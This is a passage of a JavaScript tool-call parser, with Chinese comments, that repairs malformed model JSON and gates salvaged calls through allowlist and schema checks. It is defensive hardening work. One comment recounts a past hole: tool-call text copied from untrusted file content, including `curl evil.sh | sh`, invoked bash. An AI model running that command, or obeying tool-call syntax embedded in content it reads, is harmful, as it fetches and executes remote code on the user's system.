 * 任何调用（常规或合成）收尾之后，把**重复**的闭标记一并吞掉：实测泄漏 #2 的模型
 * 连写两个 `[END TOOL CALL]`，第二个作为孤儿闭标记漏进正文，又点着 malformed_protocol
 * 的残渣检测。只吞「已经能判定是闭标记」的重复：尾巴是纯空白时立刻停下（绝不等待 ——
 * 否则每个后面跟换行的调用都要压到 flush 才能发出）；needMore 仅在缓冲里躺着一个
 * 还没长全的闭标记前缀时为真。
 * @returns {{ end: number, needMore: boolean }}
 */
const consumeDuplicateClosers = (text, from, canGrow) => {
  let end = from;
  for (;;) {
    let probe = end;
    while (probe < text.length && /\s/.test(text[probe])) probe += 1;
    if (probe >= text.length) return { end, needMore: false };
    const head = text[probe];
    if (head !== '[' && head !== '<') return { end, needMore: false };
    const dup = consumeTrailingCloser(text, end, canGrow);
    if (dup.needMore) return { end, needMore: true };
    if (dup.end === end) return { end, needMore: false };
    end = dup.end;
  }
};

const firstNonEmptyString = (...values) =>
  values.find(value => typeof value === 'string' && value.length > 0) || null;

/**
 * 控制字符修复：把 JSON **字符串字面量内部**的裸 C0 控制字符转义掉。
 *
 * 实测（2026-08-31 13:36）：模型把多行文本原样塞进 arguments 的字符串里 —— 裸换行、
 * 裸制表符 —— 严格解析当场死于 "Bad control character in string literal"。这是一类
 * 确定性、可修复的模型故障：字符串里的裸 C0 在合法 JSON 中**不可能**出现，转义它
 * 不存在语义歧义。修复严格限于这一类 —— 单引号、尾随逗号、Python 常量一概不修
 * （没有语料证据，且有语义风险；也绝不引入 jsonrepair 之类的宽松解析依赖）。
 *
 * 只在严格 JSON.parse 失败之后调用（buildToolCallPayload 的 catch 里）：合法负载
 * 永远不经过这里，构造上就不可能被改动。字符游走的状态机与 extractBalancedObject
 * 同一套纪律：尊重反斜杠转义，只在 inString 状态下动手。
 * @param {string} jsonText - 严格解析失败的 JSON 文本
 * @returns {string|null} 修复后的文本；没有任何可修复字符时返回 null
 */
const escapeRawControlCharsInStrings = (jsonText) => {
  const text = String(jsonText);
  let out = '';
  let inString = false;
  let escaped = false;
  let repaired = false;
  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (inString) {
      if (escaped) {
        escaped = false;
        out += char;
        continue;
      }
      if (char === '\\') {
        escaped = true;
        out += char;
        continue;
      }
      if (char === '"') {
        inString = false;
        out += char;
        continue;
      }
      const code = char.charCodeAt(0);
      if (code <= 0x1f) {
        repaired = true;
        if (char === '\n') out += '\\n';
        else if (char === '\r') out += '\\r';
        else if (char === '\t') out += '\\t';
        else out += `\\u${code.toString(16).padStart(4, '0')}`;
        continue;
      }
      out += char;
      continue;
    }
    if (char === '"') inString = true;
    out += char;
  }
  return repaired ? out : null;
};

/**
 * 引号修复：把负载里**没加引号的键**和**丢了开引号的字符串值**补上引号。
 *
 * 实测（2026-08-31 16:39，事故 3）：模型写出 `{command:find … 2>/dev/null", "description": …}`
 * —— 键没有引号，值丢了开引号但**留着闭引号**。引号奇偶被打破后 extractBalancedObject
 * 永远配不平，整段按 truncated_tool_call 死掉，残渣泄漏给客户端。
 *
 * 修复是确定性的、绝不重塑内容：
 * - 键位置的裸标识符加引号（`command:` → `"command":`）。
 * - 值位置的裸内容开一个引号，**复用文本里已有的下一个 `"` 作闭引号**；没有现成
 *   闭引号时字符串不闭合，严格解析当场拒绝 —— 绝不猜测值在哪里结束。
 * - 裸区间内的反斜杠与 C0 控制字符按 JSON 规则转义：字节必须原样往返，
 *   `C:\foo` 绝不能解析成带换页符的另一条命令。
 * - `true`/`false`/`null` 仅在后面**紧跟分隔符**（空白 / `,` / `}` / `]`）时算字面量，
 *   否则按裸字符串起点处理（`find …` 以 f 开头，绝不能吞成 false）。
 * - 数字按完整 token 放行（`1.5` 不能在小数点处被劈成两截）。
 *
 * 与 escapeRawControlCharsInStrings 同一套 in-string 状态机纪律，不新增第四种扫描
 * 风格。修复产物必须再过严格 JSON.parse + 白名单 + schema 三道闸门（见
 * buildToolCallPayload / salvageTruncatedSpan），任何一道不过就回到今天的错误路径。
 * 没有任何可修复点时返回 null（合法 JSON 是不动点）。
 * @param {string} jsonText - 严格解析失败的 JSON 文本
 * @returns {string|null}
 */
const repairLooseToolPayload = (jsonText) => {
  const text = String(jsonText);
  let out = '';
  let repaired = false;
  let inString = false;
  let escaped = false;
  let inLoose = false;
  const stack = [];
  let expectKey = false;

  const literalLengthAt = (i) => {
    const match = text.slice(i, i + 6).match(/^(true|false|null)/);
    if (!match) return 0;
    // 输入结束也算分隔符：截断的 `{a:true` 里 true 仍是字面量，不能被降格成裸字符串。
    const next = text[i + match[1].length];
    return (next === undefined || next === ',' || next === '}' || next === ']' ||
        next === ' ' || next === '\t' || next === '\r' || next === '\n')
      ? match[1].length
      : 0;
  };

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (inString) {
      if (escaped) escaped = false;
      else if (char === '\\') escaped = true;
      else if (char === '"') inString = false;
      out += char;
      continue;
    }
    if (inLoose) {
      // 裸值提升成字符串：复用下一个现成的 '"' 作闭引号；区间内按 JSON 规则转义。
      if (char === '"') {
        inLoose = false;
        out += char;
        continue;
      }
      if (char === '\\') {
        out += '\\\\';
        continue;
      }
      const code = char.charCodeAt(0);
      if (code <= 0x1f) {
        if (char === '\n') out += '\\n';
        else if (char === '\r') out += '\\r';
        else if (char === '\t') out += '\\t';
        else out += `\\u${code.toString(16).padStart(4, '0')}`;
        continue;
      }
      out += char;
      continue;
    }
    if (char === '"') {
      inString = true;
      out += char;
      continue;
    }
    if (char === '{') {
      stack.push('{');
      expectKey = true;
      out += char;
      continue;
    }
    if (char === '[') {
      stack.push('[');
      expectKey = false;
      out += char;
      continue;
    }
    if (char === '}' || char === ']') {
      stack.pop();
      expectKey = false;
      out += char;
      continue;
    }
    if (char === ',') {
      expectKey = stack[stack.length - 1] === '{';
      out += char;
      continue;
    }
    if (char === ':') {
      expectKey = false;
      out += char;
      continue;
    }
    if (char === ' ' || char === '\t' || char === '\r' || char === '\n') {
      out += char;
      continue;
    }
    if (expectKey) {
      const ident = text.slice(i).match(/^[A-Za-z_$][\w$-]*/);
      if (ident) {
        out += `"${ident[0]}"`;
        i += ident[0].length - 1;
        expectKey = false;
        repaired = true;
        continue;
      }
      // 不是标识符：原样放行，让严格解析拒绝。
      out += char;
      continue;
    }
    if (char === '-' || (char >= '0' && char <= '9')) {
      const num = text.slice(i).match(/^-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?/);
      if (num) {
        out += num[0];
        i += num[0].length - 1;
        continue;
      }
    }
    const literalLen = literalLengthAt(i);
    if (literalLen > 0) {
      out += text.slice(i, i + literalLen);
      i += literalLen - 1;
      continue;
    }
    // 值位置的裸内容：开引号进入 loose 态，当前字符重走一遍（进上面的转义逻辑）。
    out += '"';
    inLoose = true;
    repaired = true;
    i -= 1;
  }
  return repaired ? out : null;
};

/**
 * 字符串内引号修复：把 JSON 字符串字面量**内部**没转义的 `"` 转成 `\"`。
 *
 * 实测（2026-09-02 事故，5 段叙述式调用）：Qwen 最常见的 JSON 故障就是 shell 命令里的
 * 引号原样落进字符串 —— `"command": "cd "/x" && echo "hi""`。严格解析当场死，引号修复
 * （repairLooseToolPayload）修的是丢引号，不是多引号，也救不回来。
 *
 * 判定是**键/值感知**的，容器栈与 repairLooseToolPayload 同一套：对象里 `:` 之前的
 * 字符串是**键**，它的 `"` 只在下一个非空白字符是 `:` 时闭合；`:` 之后（或数组里）的
 * 字符串是**值**，它的 `"` 只在下一个非空白字符是 `,` `}` `]` 或输入结束时闭合 ——
 * 且那个分隔符之后还得接得上（`,` 后在对象里必须是 `"`、数组里是任何值的开头；
 * `}`/`]` 必须关的是当前容器且之后是 `,` `}` `]` 或结束）。其余一切在字符串里的 `"`
 * 都是字面量 → `\"`。review loop 1：把 `:` 放进闭合集的扁平规则会毁掉每一条带
 * `"key":` 的命令（`curl -d '{"x": 1}'`、jq、awk printf），只看一个字符会毁掉
 * `echo "}"`。歧义按"最早能成为合法 JSON 的位置"解决（`echo "hi", "description": …`
 * 里第一个后跟 `,`+键的引号就闭合），严格解析 + schema 闸门封住误判的爆炸半径。
 *
 * 与 escapeRawControlCharsInStrings 同一套 in-string 状态机纪律：尊重反斜杠转义，
 * 只在 inString 状态下动手。合法 JSON 是不动点 —— 每个真正的闭引号后面按定义就是
 * 上述分隔符之一 —— 没有任何改动时返回 null。只在严格解析失败后调用。
 * @param {string} jsonText - 严格解析失败的 JSON 文本
 * @returns {string|null}
 */
const JSON_VALUE_START_RE = /[-0-9"{[tfn]/;
const escapeInnerQuotesInStrings = (jsonText) => {
  const text = String(jsonText);
  let out = '';
  let repaired = false;
  let inString = false;
  let isKey = false;
  let escaped = false;
  const stack = [];
  let expectKey = false;

  const nextNonWhitespace = (from) => {
    let j = from;
    while (j < text.length && /\s/.test(text[j])) j += 1;
    return j;
  };
  const isStructural = (char) => char === ',' || char === '}' || char === ']';

  // 值字符串在 i 处的 '"' 能否闭合：后面的分隔符本身，以及分隔符之后的第一个 token。
  const valueClosesAt = (i) => {
    const j = nextNonWhitespace(i + 1);
    if (j >= text.length) return true;
    const next = text[j];
    const top = stack[stack.length - 1];
    if (next === ',') {
      const k = nextNonWhitespace(j + 1);
      if (k >= text.length) return true;
      return top === '[' ? JSON_VALUE_START_RE.test(text[k]) : text[k] === '"';
    }
    if (next === '}' || next === ']') {
      if (next === '}' ? top !== '{' : top !== '[') return false;
      const k = nextNonWhitespace(j + 1);
      return k >= text.length || isStructural(text[k]);
    }
    return false;
  };
  const keyClosesAt = (i) => {
    const j = nextNonWhitespace(i + 1);
    return j < text.length && text[j] === ':';
  };

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (inString) {
      if (escaped) {
        escaped = false;
        out += char;
        continue;
      }
      if (char === '\\') {
        escaped = true;
        out += char;
        continue;
      }
      if (char === '"') {
        if (isKey ? keyClosesAt(i) : valueClosesAt(i)) {
          inString = false;
          out += char;
          continue;
        }
        out += '\\"';
        repaired = true;
        continue;
      }
      out += char;
      continue;
    }
    if (char === '"') {
      inString = true;
      isKey = expectKey;
      out += char;
      continue;
    }
    if (char === '{') {
      stack.push('{');
      expectKey = true;
    } else if (char === '[') {
      stack.push('[');
      expectKey = false;
    } else if (char === '}' || char === ']') {
      stack.pop();
      expectKey = false;
    } else if (char === ',') {
      expectKey = stack[stack.length - 1] === '{';
    } else if (char === ':') {
      expectKey = false;
    }
    out += char;
  }
  return repaired ? out : null;
};

/**
 * 触发器尾巴上的名字提示。事故 3 的形态：`[TOOL_CALL]Bash{…}` —— 触发器正则吃掉
 * `[TOOL_CALL`，尾巴是 `]Bash`，真正的工具名骑在触发器和负载之间。
 *
 * 「名字只能来自负载」的铁律（见 buildToolCallPayload 头注释）在这里有一个**受闸门
 * 保护的例外**：尾巴名字只作为 hint 携带，只有在（1）负载缺 name 信封、（2）hint 在
 * 非空白名单里、（3）修复后 arguments 的每个顶层键都在该工具声明的
 * input_schema.properties 里，三条全部成立时才被采用（见 gateSalvagedPayload）。
 * 不可信内容抄回来的 `<tool_call bash>` 过不了这三连闸门；判不满足就回到今天的
 * 错误路径，绝不执行。只认方括号触发器（尖括号形态不携带 `]`）；尾巴除名字外只许空白。
 * @param {string} triggerText - 触发器原文
 * @param {string} tail - 触发器结尾到负载 '{' 之间的文本
 * @returns {string|null}
 */
const NAME_HINT_TAIL_RE = /^\][ \t]*([A-Za-z_][\w-]{0,63})[ \t\r\n]*$/;
const extractTriggerNameHint = (triggerText, tail) => {
  if (!triggerText || triggerText.charAt(0) !== '[') return null;
  const match = String(tail || '').match(NAME_HINT_TAIL_RE);
  return match ? match[1] : null;
};

/**
 * 抢救的 schema 闸门：修复后 arguments 的每个顶层键都必须出现在该工具声明的
 * input_schema.properties 里，**且** schema 声明的每个 required 键都必须在场
 * （frozen Always，review loop 1）——空 `{}` 对带 required 的 schema 不算"空过"，
 * 抢救绝不发射缺必填参数的 tool_use。误修复把一个值劈成幻影键时，幻影键不在
 * schema 里 —— 拒绝；schema 缺席（调用方没传、工具没声明 properties、arguments
 * 不是普通对象）一律拒绝（fail closed）。确定性抢救绝不执行被重塑过的命令：
 * 这道闸门就是那句承诺的机制。toolSchemas 是普通对象（anthropic.js 用
 * Object.create(null) 构造，工具名来自请求方，不能让 __proto__ 之类的名字碰
 * 原型链）。
 */
const argumentsMatchToolSchema = (name, args, toolSchemas) => {
  if (!toolSchemas || typeof toolSchemas !== 'object') return false;
  if (!Object.prototype.hasOwnProperty.call(toolSchemas, name)) return false;
  const schema = toolSchemas[name];
  const properties = schema?.properties;
  if (!properties || typeof properties !== 'object') return false;
  if (!args || typeof args !== 'object' || Array.isArray(args)) return false;
  if (!Object.keys(args).every(key => Object.prototype.hasOwnProperty.call(properties, key))) {
    return false;
  }
  const required = Array.isArray(schema.required) ? schema.required : [];
  return required.every(key => Object.prototype.hasOwnProperty.call(args, key));
};

/** 抢救三连闸门：非空白名单 + 名字在白名单 + schema 键全命中。任何一道不过 → 不抢救。 */
const gateSalvagedPayload = (payload, salvage) =>
  !!(salvage && salvage.allowedToolNames && salvage.allowedToolNames.has(payload.name) &&
    argumentsMatchToolSchema(payload.name, payload.arguments, salvage.toolSchemas));

/**
 * 正文之后的**语义门**（替代位置门）：名字在白名单、arguments 是普通对象、schema 声明的
 * 每个 required 键都在场。比抢救闸门**松**：未声明的多余键放行（Qwen 会随手加一个
 * "reason" 之类的键 —— review loop 1 里一个多余键就把一段叙述后的真调用静默吞掉了），
 * 没有 required 的 schema 任何普通对象都过。松是有理由的：这道门验的是**严格解析**
 * 出来的负载，不是修复后重塑过的文本 —— 经过引号修复才到这里的负载已经先过了
 * gateSalvagedPayload（buildToolCallPayload 的 quoteRepaired 路径）。
 * 白名单 / toolSchemas 的管道与抢救闸门共用（salvage 对象）；toolSchemas 缺席 →
 * 拒绝（fail closed，与 spec 的 Always 一致）。
 */
const gateAfterProsePayload = (payload, salvage) => {
  if (!salvage || !salvage.allowedToolNames || !salvage.allowedToolNames.has(payload.name)) return false;
  const schemas = salvage.toolSchemas;
  if (!schemas || typeof schemas !== 'object') return false;
  const args = payload.arguments;
  if (!args || typeof args !== 'object' || Array.isArray(args)) return false;
  // 工具在 toolSchemas 里没有条目 → 拒绝（与 argumentsMatchToolSchema 同一条 hasOwnProperty
  // 纪律，review loop 2）：anthropic.js 对重名工具会从 toolSchemas 里删掉条目却把名字留在
  // 白名单里，"没有条目"不等于"没有 required"。条目在、没有 required → 任何普通对象都过。
  if (!Object.prototype.hasOwnProperty.call(schemas, payload.name)) return false;
  const schema = schemas[payload.name];
  const required = Array.isArray(schema?.required) ? schema.required : [];
  // required 键必须在场**且非空**：`{"command": null}` 不是一条能执行的命令。
  return required.every(key =>
    Object.prototype.hasOwnProperty.call(args, key) && args[key] !== null && args[key] !== undefined);
};

/**
 * 交付层的残渣剥离 —— **位置驱动**，绝不搜索。
 *
 * spans 是解析器登记的被定罪原文（`{ text, at, channel? }`）：text 是收窄到
 * **可证明是协议**的字节（有闭标记时到闭标记结束，没有闭标记时只有触发器 +
 * 尾巴 —— 配不平的负载无从与后续正文划界，宁可少剥也不吞回答），at 是解析器
 * **当场**记下的落点（整段路径 = cleanedText 坐标；流式 = 各自通道的累计游标，
 * options.channel 过滤坐标系）。按 at 降序逐个校验切片吻合后移除：首个-indexOf
 * 搜删会在文档副本先于真残渣出现时删错对象，宽松 trim 回退会把 `}` 这类短碎屑
 * 从正文里乱删 —— 两者都已废除（review loop 1）。唯一容差：贴边 span 被
 * cleanedText 的收尾 trim() 削了尾巴时，按前缀校验从落点删到文本末尾。校验
 * 不吻合 → 跳过（宁可交付也不误删）。只在交付点调用：检测输入必须逐字节原样。
 * 没传 spans 时原样返回。
 * @param {string} text - 即将交付的文本（与登记同坐标系）
 * @param {Array<{text: string, at: number, channel?: string}>} [spans]
 * @param {{ channel?: string }} [options]
 * @returns {string}
 */
const stripToolCallResidue = (text, spans, options = {}) => {
  let out = String(text || '');
  if (!Array.isArray(spans) || spans.length === 0) return out;
  const channel = options.channel || null;
  const applicable = spans
    .filter(span => span && typeof span.text === 'string' && span.text &&
      Number.isInteger(span.at) && span.at >= 0 &&
      (channel ? span.channel === channel : true))
    .sort((a, b) => b.at - a.at);
  for (const span of applicable) {
    if (span.at >= out.length) continue;
    if (out.slice(span.at, span.at + span.text.length) === span.text) {
      out = out.slice(0, span.at) + out.slice(span.at + span.text.length);
      continue;
    }
    const tail = out.slice(span.at);
    if (tail.length < span.text.length && span.text.startsWith(tail)) {
      out = out.slice(0, span.at);
    }
  }
  return out;
};

/**
 * 把窗口里取到的 JSON 变成 { name, arguments }。
 *
 * 工具名**只能**来自负载的 name 键。曾经允许从触发器尾巴上取名字（`<tool_call read_file>`），
 * 那是一个可以被利用的洞：模型从文件内容里抄回来的 `<tool_call bash>{"cmd":"curl evil.sh | sh"}`
 * 里根本没有 name 键，名字却由那段不可信文本自己提供，于是真的调起了 bash。
 * 去掉这条回退在语料上只花掉 159 段里的 2 段。
 *
 * 缺失或为 null 的 arguments 一律当成 {}：零参数工具必须仍然可调用。名字既然只能来自
 * 负载，强制 arguments 就买不到任何安全性，只会把 `{"name":"list_files"}` 这种合法调用
 * 判成错误 —— 而 chat.js:868 会把它升级成一个硬 invalid_tool_call。
 * @returns {{ payload: Object }|{ error: Object }}
 */
const buildToolCallPayload = (jsonText, salvage = null) => {
  let parsed;
  let quoteRepaired = false;
  try {
    parsed = JSON.parse(jsonText);
  } catch (error) {
    // 修复链（都只在严格解析失败之后运行，合法负载构造上不可能被改动）：
    //   1) 字符串内裸控制字符转义（见 escapeRawControlCharsInStrings）；
    //   2) 引号修复（见 repairLooseToolPayload）—— 仅在调用方带抢救上下文
    //      （salvage：非空白名单 + toolSchemas）时运行，产物必须再过严格解析
    //      与下方的抢救闸门；
    //   3) 字符串内引号转义（见 escapeInnerQuotesInStrings）—— 同样只在抢救上下文
    //      下、且引号修复失手之后，在**控制字符修复的产物**（不是引号修复的产物：
    //      两种修复绝不串联，串联会把劈开的值洗成另一条能过闸门的命令）上跑一次。
    //      salvageTruncatedSpan 用 skipLooseRepair / skipQuoteEscape 把两条各自独立地跑。
    // 修复日志只登记类型，绝不带负载内容 —— Node 24 的 e.message 会把负载
    // 片段嵌进去，负载可能携带凭据。
    const repairedText = escapeRawControlCharsInStrings(jsonText);
    if (repairedText !== null) {
      try {
        parsed = JSON.parse(repairedText);
      } catch (_) {
        parsed = undefined;
      }
      if (parsed !== undefined) {
        warnTool('tool_call 负载修复：严格解析失败后转义字符串内的裸控制字符，重新解析成功');
      }
    }
    if (parsed === undefined && salvage && !salvage.skipLooseRepair) {
      const looseText = repairLooseToolPayload(repairedText ?? jsonText);
      if (looseText !== null) {
        try {
          parsed = JSON.parse(looseText);
          quoteRepaired = true;
        } catch (_) {
          parsed = undefined;
        }
      }
    }
    if (parsed === undefined && salvage && !salvage.skipQuoteEscape) {
      const quotedText = escapeInnerQuotesInStrings(repairedText ?? jsonText);
      if (quotedText !== null) {
        try {
          parsed = JSON.parse(quotedText);
          quoteRepaired = true;
        } catch (_) {
          parsed = undefined;
        }
      }
    }
    if (parsed === undefined) {
      return { error: { type: 'invalid_json', raw: jsonText, reason: error?.message } };
    }
  }
  if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
    return { error: { type: 'invalid_json', raw: jsonText, reason: 'not an object' } };
  }
  const name = firstNonEmptyString(parsed.name, parsed.tool, parsed.function);
  if (!name) {
    // 无信封负载 + 触发器尾巴名字：受三连闸门保护的例外（见 extractTriggerNameHint）。
    // 整个已解析对象就是 arguments。闸门不满足 → 拒绝且**独立定型**为
    // salvage_rejected（review loop 1，条目 11）：这正是本防御瞄准的可诊断类，
    // 不能在日志里冒充真正的坏 JSON。绝不执行。
    if (salvage?.nameHint) {
      const candidate = { name: salvage.nameHint, arguments: parsed };
      if (gateSalvagedPayload(candidate, salvage)) {
        warnTool(`tool_call 负载抢救：无信封负载采用触发器尾巴名字，白名单 + schema 闸门放行${quoteRepaired ? '（含引号修复）' : ''}`);
        return { payload: candidate };
      }
      return { error: { type: 'salvage_rejected', raw: jsonText, reason: 'name-hint candidate failed the allowlist/schema gate' } };
    }
    return { error: { type: 'invalid_json', raw: jsonText, reason: 'no tool name' } };
  }
  const payload = { name, arguments: parsed.arguments ?? parsed.parameters ?? parsed.args ?? {} };
  // 引号修复的产物（以及 forceGate 的抢救调用方，见 salvageTruncatedSpan）必须
  // 整体过抢救闸门：修复把一个值劈成幻影键时 schema 闸门拒绝，回到错误路径 ——
  // 同样定型为 salvage_rejected（可诊断，不冒充坏 JSON）。
  if (quoteRepaired || salvage?.forceGate) {
    if (!gateSalvagedPayload(payload, salvage)) {
      return { error: { type: 'salvage_rejected', raw: jsonText, reason: 'repaired payload failed the allowlist/schema gate' } };
    }
    if (quoteRepaired) {
      warnTool('tool_call 负载抢救：引号修复后严格解析成功，白名单 + schema 闸门放行');
    }
  }
  return { payload };
};

/**
 * truncated_tool_call 定罪点的最后一搏：负载配不平（引号奇偶被打破）的整段，
 * 在按错误落账**之前**跑一次完整抢救。
 *
 * 步骤：先用方括号闭标记扫描把区间截到 `[END TOOL CALL]` 之前（配平已死，
 * 闭标记是这段里**唯一**还可信的定界证据 —— 没有闭标记就没有抢救：配不平的
 * 负载无从与后续正文划界，尾巴按构造可能是真实回答，消费它就是吞回答
 * （frozen Always，review loop 1））；对区间**各自独立**地跑两种修复（引号修复、
 * 字符串内引号转义 —— 绝不串联：串联会把劈开的值洗成另一条能过 schema 闸门的
 * 重塑命令）；每种修复的产物上重新配平取对象；对象再走 buildToolCallPayload
 * 全链（严格解析 → 控制字符转义 → 信封 / nameHint，forceGate 让信封形态也过
 * 白名单 + schema 抢救闸门），并用 skipQuoteEscape / skipLooseRepair 关掉**另一种**
 * 修复。任何一步失手 → 试下一种；都失手 → 返回 null，调用方照今天定罪。成功时
 * 整段（含闭标记、含对象之后的协议碎屑，如事故 3 的多余 `}`）都被消费 —— 闭标记
 * 以内按构造是协议残渣，不是回答。每段只跑一次、O(span)。
 * @param {string} spanText - 从负载 '{' 起的原文
 * @param {Object} salvage - { allowedToolNames, toolSchemas, nameHint }
 * @returns {{ payload: Object, end: number }|null} end = spanText 里闭标记之后的下标
 */
const salvageTruncatedSpan = (spanText, salvage) => {
  if (!salvage) return null;
  const closerMatch = spanText.match(TOOL_CALL_CLOSE_BRACKET_SCAN_RE);
  if (!closerMatch) return null;
  // 闭标记必须是区间里**最早**的锚点（review loop 2）：它之前若先出现下一个正则触发器
  // 或下一个行首负载候选，那个闭标记属于**后面那个调用**，用它划出来的区间横跨了正文
  // 和别人的负载 —— 修出来的东西就算过了闸门也是一条重塑过的命令，而且会把正文和
  // 后面那个调用一起吞掉。不抢救，交给残片切点。抢救只在首位跑，候选谓词取首位那条。
  if (TOOL_CALL_TRIGGER_RE.test(spanText.slice(1, closerMatch.index))) return null;
  if (nextPayloadCandidate(spanText, 1, false, closerMatch.index, false) !== -1) return null;
  const region = spanText.slice(0, closerMatch.index);
  const attempts = [
    ['引号修复', repairLooseToolPayload(region)],
    ['字符串内引号转义', escapeInnerQuotesInStrings(region)]
  ];
  // 每种修复的产物都只许**严格**解析（两种修复在 buildToolCallPayload 里一并关掉，
  // review loop 2）：只关"另一种"会让引号修复的产物再被引号修复一遍、转义的产物再被
  // 转义一遍 —— 产物要么本身就是合法 JSON，要么就该失败。
  const strict = { skipLooseRepair: true, skipQuoteEscape: true, forceGate: true };
  for (const [label, repairedRegion] of attempts) {
    if (repairedRegion === null) continue;
    const object = extractBalancedObject(repairedRegion, 0);
    if (!object) continue;
    const built = buildToolCallPayload(object.text, { ...salvage, ...strict });
    if (built.error) continue;
    warnTool(`truncated_tool_call 抢救成功：${label}后负载配平并通过全部闸门（span ${spanText.length} 字符）`);
    return {
      payload: built.payload,
      end: closerMatch.index + closerMatch[0].length
    };
  }
  return null;
};

/** allowedToolNames 闸门。两条路径共用同一个，任何一侧都不会漏掉。 */
const gateToolName = (payload, allowedToolNames) => {
  if (allowedToolNames && !allowedToolNames.has(payload.name)) {
    return { type: 'unknown_tool', name: payload.name };
  }
  return null;
};

// logger 上只有 warn，没有 warning。原来满仓库的 `logger.warning?.(...)` 因此是空操作 ——
// 这正是“标签写坏了却一行日志都没有”的另一半原因。
const warnTool = (message, data) => logger.warn?.(message, 'TOOL', '', data ?? null);

// invalid_json 的 reason 是 JSON.parse 的 e.message —— 现代 V8 会把负载片段原文嵌进去
// （`Unexpected token 'S', ..."<负载回显>"... is not valid JSON`）。错误**对象**保留完整
// reason（重试提示与测试依赖它），但日志层只放行开头的错误种类：砍在第一个引号 /
// 换行 / " in JSON" / " at position" 边界，并封顶长度。诊断需要的是原因，不是内容。
const sanitizeJsonReasonForLog = (reason) => {
  const text = String(reason || '');
  const cut = text.search(/["'`‘’“”\n\r]| in JSON| at position/i);
  const head = (cut === -1 ? text : text.slice(0, cut)).trim();
  return (head || 'invalid_json').slice(0, 120);
};

// 只登记“为什么失败”和“多长”，绝不把负载本身打进日志：工具参数里可能有凭据、
// 令牌或 email:password。诊断需要的是原因，不是内容。
const logToolError = (error) => {
  if (!error) return;
  if (error.type === 'unknown_tool') {
    warnTool(`工具调用被拒绝：${error.name} 不在 allowedToolNames 里`);
    return;
  }
  const size = typeof error.raw === 'string' ? error.raw.length : 0;
  const reason = error.type === 'invalid_json'
    ? sanitizeJsonReasonForLog(error.reason)
    : (error.reason || error.type);
  warnTool(`解析 tool_call 负载失败（${reason}，负载 ${size} 字符）`);
};

// 触发器被当成文档压制掉时也要留痕。静默压制正是这次要消灭的失败类型：
// 真实调用变成纯文本，既没有错误也没有警告，没人看得见。
const logTriggerSuppressed = (trigger, why) => {
  warnTool(`tool_call 触发器按${why}处理，未识别为调用`, trigger);
};

const logTriggeredUnrecovered = (trigger) => {
  warnTool(
    `出现 tool_call 触发器，但其后 ${TOOL_CALL_PAYLOAD_WINDOW} 字符窗口内没有可用负载，按正文放行`,
    trigger
  );
};

const normalizeAllowedToolNames = (allowedToolNames) => {
  if (!allowedToolNames) return null;
  const names = allowedToolNames instanceof Set ? allowedToolNames : new Set(allowedToolNames);
  return names.size > 0 ? names : null;
};

// 上游 delta 的"正文"phase 集合。单一来源：chat-helpers.js 的归一化器与下面的原生
// 累积器共用（chat-helpers 已依赖本模块，反向引用会成环，所以定义放在这里）。
const ANSWER_PHASES = new Set(['answer', 'final', 'final_answer', 'response']);

const serializeToolArguments = (args) => {
  if (typeof args === 'string') {
    try {
      JSON.parse(args);
      return args;
    } catch (_) {
      return JSON.stringify(args);
    }
  }
  return JSON.stringify(args ?? {});
};

const compactDescription = (value, maxLength = 320) => {
  const text = String(value || '').replace(/\s+/g, ' ').trim();
  if (text.length <= maxLength) return text;
  return `${text.slice(0, maxLength - 1)}…`;
};

/**
 * 识别模型用“我将执行/Let me inspect”代替真实工具调用的占位回复。
 * 仅匹配明确的动作动词，避免把普通解释或建议误判成工具回合。
 */
const looksLikeUnexecutedToolAction = (value) => {
  const text = String(value || '').trim().replace(/^[#>*\-\s]+/, '');
  const english = /^(?:i(?:['’]ll| will)|let me|i need to|next,?\s+i(?:['’]ll| will))\s+(?:now\s+)?(?:run|execute|check|inspect|read|edit|write|search|open|call|use|look|test|verify|build|deploy|create|update|fetch)\b/i;
  const chinese = /^(?:我(?:将|会|先|需要|正在)|让我|接下来(?:我)?(?:将|会|先)?|现在(?:我)?(?:将|会|先|来)?|下面(?:我)?(?:将|会|先)?|正在)(?:立即|马上|先|来)?(?:运行|执行|检查|查看|读取|编辑|修改|写入|搜索|打开|调用|使用|测试|验证|构建|部署|创建|更新|获取)/;
  return english.test(text) || chinese.test(text);
};

// 协议残渣检测：模型把方括号协议写坏时（孤儿 [END TOOL CALL] 闭标记，或答案
// 开头直接是 {"name":…,"arguments":…} 负载而没有开触发器），泄漏为可见正文时
// 点起 malformed_protocol 重试。负载形状那一半与合成开端共用同一个谓词
// （isLeakedToolPayloadShape，见其注释）：抢救的闸门放行成调用的，永远不会
// 再落进这里；被闸门拒绝按正文放行的，正好被这里接住。
// 闭标记扫描复用上面的有界正则，仅去掉行首锚点以便在整段文本中查找。
const TOOL_CALL_CLOSE_BRACKET_SCAN_RE = new RegExp(TOOL_CALL_CLOSE_BRACKET_RE.source.replace(/^\^/, ''), 'i');
const containsOrphanProtocolResidue = (value) => {
  const text = String(value || '');
  if (TOOL_CALL_CLOSE_BRACKET_SCAN_RE.test(text)) return true;
  return isLeakedToolPayloadShape(text);
};

// 合成开端被闸门拒绝时留痕。与其他工具日志同一条纪律：只登记原因，绝不把负载
// 内容打进日志（可能携带凭据）。软拒绝不是错误（不进 errors）：正文之后的失败
// 绝不点火重试（frozen Always）；首位 + 闭标记的硬拒绝走 errors（见 resolveSyntheticAt）。
const logSyntheticRejected = (reason) => {
  warnTool(`裸负载抢救被拒绝（${reason}），按正文放行`);
};

// 语义门放行时的来源日志：每个正文之后晋升的调用一行，只带工具名，绝不带负载
// （审计线索，见头注释"位置门的现状"与 spec 的 Accepted risk）。
const logAfterProsePromotion = (name, how) => {
  warnTool(`tool_call 出现在正文之后（${how}），负载通过白名单 + required 语义门，按调用晋升：${name}`);
};

/**
 * 配不平的合成候选的残片切点（review loop 1 / 2）：锚点是下一个正则触发器、下一个方括号
 * 闭标记的**结束**、下一个行首负载候选三者里**最早**的那个 —— 一刀切到文本末尾会把
 * 后面写对了的调用一起吞掉（`Read, Bash(配不平), Read` 必须得到两个调用）。
 *   - 锚点是闭标记（viaCloser）：残片到闭标记结束，可证明是协议（首位硬错误的判据）；
 *     closerStart 是闭标记自身的起点（正文之后：闭标记之前可见、闭标记消费）。
